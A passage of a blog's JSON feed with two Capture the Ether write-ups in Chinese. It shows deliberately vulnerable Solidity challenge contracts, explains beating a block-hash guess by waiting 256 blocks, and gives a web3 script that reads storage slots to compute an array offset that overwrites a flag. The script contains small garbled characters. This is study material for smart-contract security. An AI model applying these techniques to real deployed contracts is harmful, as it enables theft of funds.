class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PredictTheBlockHashChallenge &#123;</span><br><span class=\"line\">    address guesser;</span><br><span class=\"line\">    bytes32 guess;</span><br><span class=\"line\">    uint256 settlementBlockNumber;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">PredictTheBlockHashChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">lockInGuess</span><span class=\"params\">(bytes32 hash)</span> public payable &#123;</span><br><span class=\"line\">        require(guesser == <span class=\"number\">0</span>);</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = msg.sender;</span><br><span class=\"line\">        guess = hash;</span><br><span class=\"line\">        settlementBlockNumber = block.number + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">settle</span><span class=\"params\">()</span> public &#123;</span><br><span class=\"line\">        require(msg.sender == guesser);</span><br><span class=\"line\">        require(block.number &gt; settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (guess == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个就是我们需要提前预测 block + 1 的 hash<br>\n 但是难点是我们调用库 hash 是没法 hash 出下一块 block 的 hash 的</p>\n<blockquote>\n<p>The block hashes are not available for all blocks for scalability reasons.<br>\nYou can only access the hashes of the most recent 256 blocks, all other values will be zero.</p>\n</blockquote>\n<p>但是由于这个清零特性和块数和 hash 是异步分时的<br>\n只需要等 256 个块挖完了（15s 一个）之前猜个 0 即可</p>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/",
            "url": "https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/",
            "title": "BlockChain-from-scratch-mapping",
            "date_published": "2022-08-27T08:51:10.000Z",
            "content_html": "<p><a href=\"https://capturetheether.com/challenges/math/mapping/\">Capture the Ether - Mapping</a><br>\n 从一道题入门 blockchain</p>\n<h2 id=\"evm存储简介\"><a class=\"markdownIt-Anchor\" href=\"#evm存储简介\">#</a> EVM 存储简介</h2>\n<p>solidity 编译后的数据<br>\n是放在 slot 的结构中<br>\n slot 有 2 ^ 256 个<br>\n每一个有 256 位</p>\n<p>对于 solidity 中的可以在编译期间确定的静态元素<br>\n solc 会将其依次放入内存插槽中（slot）<br>\n<img src=\"/2022/08/27/BlockChain-from-scratch-mapping/1.png\" alt><br>\n这里 bcd 都是 256 位<br>\n所以放在 slot [0…2]<br>\n 但如果是可变长数据结构如果是 array 或者 map<br>\n 值会被放在其他地方 为了性能 这里是直接对当前的 idx 取 keccak<br>\n 比如 <code>keccak(0) = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563</code> <br>\n 如果 <code>slot[0]</code>  是 array 的话 那么数据就会被放在<br>\n <code>slot[0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563]</code>  里</p>\n<p>注意这里 keccak 是对补齐后的字符串进行 hash 的 而不是对数字<br>\n所以需要 padding 一下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>solidity 同样存在和 c 一样内存对齐的概念 不再赘述</p>\n<h2 id=\"cte-mapping\"><a class=\"markdownIt-Anchor\" href=\"#cte-mapping\">#</a> cte-mapping</h2>\n<p>首先看合约 map 的 kv 可控</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MappingChallenge &#123;</span><br><span class=\"line\">    <span class=\"type\">bool</span> public isComplete;</span><br><span class=\"line\">    uint256[] <span class=\"built_in\">map</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">set</span><span class=\"params\">(uint256 key, uint256 value)</span> public &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Expand dynamic array as needed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">map</span>.length &lt;= key) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">map</span>.length = key + <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">map</span>[key] = value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">get</span><span class=\"params\">(uint256 key)</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(uint256)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">map</span>[key];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>连接到合约</p>\n<p>set 是可以控制下标 那么给 <code>isComplete</code>  覆盖掉就行了 十分清楚<br>\n map 是可变结构 每个成员是存放在 <code>keccak(padding(1))</code>  依次往上的地方<br>\n可以打印看到</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ethers = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;ethers&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs-extra&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">&#x27;dotenv&#x27;</span>).<span class=\"title function_\">config</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"title class_\">Web3</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;web3&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> web3 =  <span class=\"keyword\">new</span> <span class=\"title class_\">Web3</span>(<span class=\"string\">&quot;your_rpc_url&quot;</span>)</span><br><span class=\"line\">contractAddr = <span class=\"string\">&quot;your_account_addr&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">cl</span> = x =&gt; <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(x)</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i %3C (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getSlot</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddr, idx)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">utils</span>.<span class=\"title function_\">sha3</span>(<span class=\"title function_\">padding</span>(idx))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>()</span><br><span class=\"line\">\t.<span class=\"title function_\">then</span>(<span class=\"function\">() =&gt;</span> process.<span class=\"title function_\">exit</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t.<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(err),</span><br><span class=\"line\">\t\tprocess.<span class=\"title function_\">exit</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#125;)&gt;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure>\n<p>第三个就是我们 map 第一个元素存放的位置<br>\n用 <code>2**256</code>  减一下就是偏移了</p>\n<p><img src=\"/2022/08/27/BlockChain-from-scratch-mapping/2.png\" alt></p>\n<p><img src=\"/2022/08/27/BlockChain-from-scratch-mapping/3.png\" alt></p>\n",
            "tags": [
                "Blockchain"
            ]
        }
    ]
}